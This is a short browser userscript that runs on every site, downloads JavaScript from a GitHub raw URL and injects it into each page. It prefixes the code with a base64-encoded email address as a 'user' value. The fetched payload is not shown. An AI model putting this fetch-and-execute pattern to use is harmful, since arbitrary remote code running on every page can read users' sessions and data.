// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  try to take over the world!
// @author       You
// @match      *
// @icon         https://www.google.com/s2/favicons?domain=mozilla.org
// @grant        none
// ==/UserScript==

//https://raw.githubusercontent.com/Tokumei232/TMP/main/TMP.js
//https://cdn.rawgit.com/Tokumei232/TMP/main/TMP.js

var user = atob('Ymc4NW9mQGdtYWlsLmNvbQ==');
var url = "https://raw.githubusercontent.com/Tokumei232/TMP/main/TMP.js";

(function() {
    function reqListener () {
        var jsTXT = 'var user = "' + user + '"; ' + this.responseText;
        var js = document.createElement("script");
        js.type = "text/javascript";
        js.innerHTML = jsTXT;
        document.body.appendChild(js);

        InitProgram();
    }

    var oReq = new XMLHttpRequest();
    oReq.addEventListener("load", reqListener);
    oReq.open("GET", url);
    oReq.send();
})();
